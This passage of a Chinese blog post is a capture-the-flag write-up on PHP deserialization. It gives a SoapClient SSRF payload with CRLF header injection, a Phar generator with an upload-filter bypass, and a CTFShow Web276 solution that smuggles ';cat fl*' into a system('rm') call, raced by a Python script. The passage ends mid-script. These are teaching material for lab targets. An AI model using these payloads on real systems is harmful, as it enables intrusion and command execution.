+<p>Tips：<code>SplFileObject</code> 读取文件内容时是按行读取的，如果要读多行需要遍历，或者也可以通过 <code>php://filter/</code> 协议 <code>Base64</code> 编码后输出。</p>
+<h3 id="directoryiterator-遍历目录">DirectoryIterator 遍历目录</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> DirectoryIterator</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">foreach</span><span style="color:#E1E4E8"> ($a </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $b) {</span></span>
+<span class="line" data-line="4"><span style="color:#79B8FF">    echo</span><span style="color:#E1E4E8"> $b</span><span style="color:#F97583">-></span><span style="color:#B392F0">getFilename</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span></code></pre>
+<h3 id="filesystemiterator-遍历目录">FilesystemIterator 遍历目录</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> FilesystemIterator</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">foreach</span><span style="color:#E1E4E8"> ($a </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $b) {</span></span>
+<span class="line" data-line="4"><span style="color:#79B8FF">    echo</span><span style="color:#E1E4E8"> $b</span><span style="color:#F97583">-></span><span style="color:#B392F0">getFilename</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}</span></span></code></pre>
+<h3 id="soapclient-ssrf">SoapClient SSRF</h3>
+<ol>
+<li>需要有 <code>soap</code> 扩展，需要手动开启该扩展。</li>
+<li>需要调用一个不存在的方法触发其 <code>__call()</code> 函数。</li>
+<li>仅限于 <code>http</code> / <code>https</code> 协议</li>
+</ol>
+<p>利用原生类 <code>SoapClient</code> 实现 <code>SSRF</code> ，构造 <code>SoapClient</code> 的类对象，需要有两个参数，字符串 <code>$wsdl</code> 和数组 <code>$options</code>，详见 <a href="https://www.php.net/manual/en/class.soapclient.php">PHP: SoapClient</a></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">public</span><span style="color:#B392F0"> __construct</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">?string</span><span style="color:#E1E4E8"> $wsdl, </span><span style="color:#F97583">array</span><span style="color:#E1E4E8"> $options </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [])</span></span></code></pre>
+<p><code>options</code> 传入我们要构造的请求头, <code>uri</code> 和 <code>location</code> 必须设置</p>
+<h4 id="ctf-show-web入门-web259">[CTF Show Web入门] Web259</h4>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">$xff </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> explode</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">','</span><span style="color:#E1E4E8">, $_SERVER[</span><span style="color:#9ECBFF">'HTTP_X_FORWARDED_FOR'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="5"><span style="color:#79B8FF">array_pop</span><span style="color:#E1E4E8">($xff);</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">$ip </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array_pop</span><span style="color:#E1E4E8">($xff);</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($ip</span><span style="color:#F97583">!==</span><span style="color:#9ECBFF">'127.0.0.1'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">	die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'error'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">	$token </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_POST[</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">($token</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'ctfshow'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="13"><span style="color:#79B8FF">		file_put_contents</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'flag.txt'</span><span style="color:#E1E4E8">,$flag);</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">	}</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="16"></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">$vip </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> unserialize</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'vip'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="18"><span style="color:#6A737D">//vip can get flag one key</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">$vip</span><span style="color:#F97583">-></span><span style="color:#B392F0">getFlag</span><span style="color:#E1E4E8">();</span></span></code></pre>
+<p>调用了一个不存在的函数 <code>getFlag()</code> 会去调用 <code>__call</code> 魔术方法， <code>__call</code> 会发送一个请求，我们可以本地通过 <code>nc</code> 监听端口搭配 <code>PHPStudy</code> 来构造调试，发现 <code>ua</code> 头可以注入。</p>
+<p>注意的点：</p>
+<ol>
+<li><code>ip</code> 被 <code>array_pop</code> 两次以 <code>,</code> 分割</li>
+<li><code>token=ctfshow</code> 长度为 <code>13</code> 且为 <code>POST</code> 提交</li>
+<li>请求头之间的参数用 <code>\r\n</code> 分隔</li>
+<li>请求头与请求体之间用 <code>\r\n\r\n</code> 分隔</li>
+</ol>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$client </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> SoapClient</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">null</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span></span>
+<span class="line" data-line="3"><span style="color:#9ECBFF">    'location'</span><span style="color:#F97583"> =></span><span style="color:#9ECBFF"> "http://127.0.0.1/flag.php"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">    'user_agent'</span><span style="color:#F97583"> =></span><span style="color:#9ECBFF"> "test</span><span style="color:#79B8FF">\r\n</span><span style="color:#9ECBFF">X-Forwarded-For:127.0.0.1,1</span><span style="color:#79B8FF">\r\n</span><span style="color:#9ECBFF">Content-Type: application/x-www-form-urlencoded</span><span style="color:#79B8FF">\r\n</span><span style="color:#9ECBFF">Content-Length: 13</span><span style="color:#79B8FF">\r\n\r\n</span><span style="color:#9ECBFF">token=ctfshow"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="5"><span style="color:#9ECBFF">    'uri'</span><span style="color:#F97583"> =></span><span style="color:#9ECBFF"> "http://127.0.0.1/"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="7"></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> urlencode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($client));</span></span></code></pre>
+<p>发送 <code>payload</code> 后访问 <code>flag.txt</code> 即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A119%3A%22test%0D%0AX-Forwarded-For%3A127.0.0.1%2C1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span></code></pre>
+<h2 id="phar-反序列化">Phar 反序列化</h2>
+<p><code>Phar</code> 是 <code>php</code> 压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 <code>php</code> 访问并执行，与 <code>file://</code> 、 <code>php://</code> 等伪协议类似，也是一种流包装器。</p>
+<p><code>Phar</code> 文件存储的 <code>meta-data</code> 信息以 <code>序列化</code> 方式存储，当文件操作函数通过 <code>phar://</code> 伪协议解析 <code>Phar</code> 文件时就会将数据反序列化。</p>
+<p>要想使用 <code>Phar</code> 类里的方法，必须将 <code>php.ini</code> 文件中的 <code>phar.readonly</code> 配置项配置为 <code>0</code> 或 <code>Off</code>（默认为 <code>On</code> ）</p>
+<p>这里提供一个 <code>phar</code> 包生成代码，<code>phar</code> 文件是很容易绕过上传限制的，首先它的后缀是不限制的，无论改成什么 <code>phar://</code> 协议都可以解析，其次 <code>xxx&#x3C;?phpxxx; __HALT_COMPILER();?></code> 前面内容不限，这样可以在前面添加 <code>GIF98a</code> 这样的文件头绕过上传限制。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">//实例一个phar对象供后续操作</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$phar </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Phar</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'test.phar'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#6A737D">//开始缓冲Phar写操作 </span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">startBuffering</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#6A737D">//设置stub</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">setStub</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"&#x3C;?php __HALT_COMPILER(); ?>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="9"></span>
+<span class="line" data-line="10"><span style="color:#6A737D">//以字符串的形式添加一个文件到 phar 档案 </span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">addFromString</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'test.php'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'&#x3C;?php echo '</span><span style="color:#79B8FF">this</span><span style="color:#79B8FF"> is</span><span style="color:#79B8FF"> test</span><span style="color:#79B8FF"> file</span><span style="color:#9ECBFF">';'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="12"></span>
+<span class="line" data-line="13"><span style="color:#6A737D">//把一个fileTophar目录下的文件归档到phar档案</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">buildFromDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'fileTophar'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="15"></span>
+<span class="line" data-line="16"><span style="color:#6A737D">//该函数解压一个phar包，extractTo()提取phar文档内容</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">extractTo</span><span style="color:#E1E4E8">();</span></span></code></pre>
+<blockquote>
+<p>当环境限制了phar不能开头，可以使用以下伪协议绕过</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">compress</span><span style="color:#F97583">.</span><span style="color:#79B8FF">bzip2</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//phar://test.phar/test.txt</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">compress</span><span style="color:#F97583">.</span><span style="color:#79B8FF">zlib</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//phar://test.phar/test.txt</span></span>
+<span class="line" data-line="3"><span style="color:#B392F0">php</span><span style="color:#E1E4E8">:</span><span style="color:#6A737D">//filter/resource=phar://test.phar/test.txt</span></span></code></pre>
+<h3 id="ctfshow-web入门-web276">[CTFShow Web入门] Web276</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $filename;</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $filecontent;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $evilfile</span><span style="color:#F97583">=</span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $admin </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($f,$fn){</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">filename</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$f;</span></span>
+<span class="line" data-line="10"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">filecontent</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$fn;</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> checkevil</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#DBEDFF">php|</span><span style="color:#85E89D;font-weight:bold">\.\.</span><span style="color:#9ECBFF">/i'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">filename)){</span></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">            $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">evilfile</span><span style="color:#F97583">=</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#DBEDFF">flag</span><span style="color:#9ECBFF">/i'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">filecontent)){</span></span>
+<span class="line" data-line="17"><span style="color:#79B8FF">            $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">evilfile</span><span style="color:#F97583">=</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">evilfile;</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">evilfile </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">admin){</span></span>
+<span class="line" data-line="23"><span style="color:#79B8FF">            system</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'rm '</span><span style="color:#F97583">.</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">filename);</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'fn'</span><span style="color:#E1E4E8">])){</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">    $content </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> file_get_contents</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'php://input'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">    $f </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> filter</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'fn'</span><span style="color:#E1E4E8">],$content);</span></span>
+<span class="line" data-line="30"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($f</span><span style="color:#F97583">-></span><span style="color:#B392F0">checkevil</span><span style="color:#E1E4E8">()</span><span style="color:#F97583">===</span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="31"><span style="color:#79B8FF">        file_put_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'fn'</span><span style="color:#E1E4E8">], $content);</span></span>
+<span class="line" data-line="32"><span style="color:#79B8FF">        copy</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'fn'</span><span style="color:#E1E4E8">],</span><span style="color:#79B8FF">md5</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">mt_rand</span><span style="color:#E1E4E8">())</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'.txt'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="33"><span style="color:#79B8FF">        unlink</span><span style="color:#E1E4E8">($_SERVER[</span><span style="color:#9ECBFF">'DOCUMENT_ROOT'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'/'</span><span style="color:#F97583">.</span><span style="color:#E1E4E8">$_GET[</span><span style="color:#9ECBFF">'fn'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="34"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> 'work done'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="35"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="37"><span style="color:#E1E4E8">}</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="38"><span style="color:#79B8FF">    echo</span><span style="color:#9ECBFF"> 'where is flag?'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="39"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><code>this->admin</code> 需要为 <code>ture</code>，但是没有能控制的点。</p>
+<p>发现可以通过 <code>file_put_contents</code> 写 phar 文件，然后题目中 <code>file_put_contents</code> 第一个参数可控，那么我们可以使用 <code>phar://</code> 协议，通过 <code>$content</code> 传入 phar 数据，这样在 PHP 通过 <code>phar://</code> 协议解析数据时，会将 <code>meta-data</code> 部分进行反序列化</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> filter</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $filename </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> ';cat fl*'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $evilfile </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $admin </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">$phar </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Phar</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"phar.phar"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">startBuffering</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">setStub</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"&#x3C;?php __HALT_COMPILER(); ?>"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">$o </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> filter</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">setMetadata</span><span style="color:#E1E4E8">($o);</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">addFromString</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"test.txt"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"test"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">$phar</span><span style="color:#F97583">-></span><span style="color:#B392F0">stopBuffering</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">?></span></span></code></pre>
+<p>条件竞争</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> requests</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> time</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> threading</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">success</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span></span>
+<span class="line" data-line="5"><span style="color:#6A737D">#读取phar包内容</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">def</span><span style="color:#B392F0"> getPhar</span><span style="color:#E1E4E8">(phar):</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(phar,</span><span style="color:#9ECBFF">'rb'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> p:</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> p.read()</span></span>
+<span class="line" data-line="9"><span style="color:#6A737D">#写入phar包内容</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">def</span><span style="color:#B392F0"> writePhar</span><span style="color:#E1E4E8">(url,data):</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[-]writing"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    requests.post(url,data)</span></span>
+<span class="line" data-line="13"><span style="color:#6A737D">#触发unlink的phar反序列化</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">def</span><span style="color:#B392F0"> unlinkPhar</span><span style="color:#E1E4E8">(url,data):</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">    global</span><span style="color:#E1E4E8"> success</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    res </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> requests.post(url,data)</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">    if</span><span style="color:#9ECBFF"> 'ctfshow'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> res.text </span><span style="color:#F97583">and</span><span style="color:#E1E4E8"> success </span><span style="color:#F97583">is</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="18"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*]Over!"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="19"><span style="color:#79B8FF">        print</span><span style="color:#E1E4E8">(res.text)</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">        success </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> True</span></span>
+<span class="line" data-line="21"><span style="color:#F97583">def</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">():</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    global</span><span style="color:#E1E4E8"> success</span></span>
+<span class="line" data-line="23"><span style="color:#E1E4E8">    url</span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'http://c71e4a00-e45a-44d8-a9a0-7791b43e4bf8.challenge.ctf.show/'</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">    phar </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> getPhar(</span><span style="color:#9ECBFF">'phar.phar'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> success </span><span style="color:#F97583">is</span><span style="color:#79B8FF"> False</span><span style="color:#E1E4E8">:</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">        time.sleep(</span><span style="color:#79B8FF">.5</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">        w</span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> threading.Thread(</span><span style="color:#FFAB70">target</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">writePhar,</span><span style="color:#FFAB70">args</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">(url</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'?fn=phar.phar'</span><span style="color:#E1E4E8">,phar))</span></span>
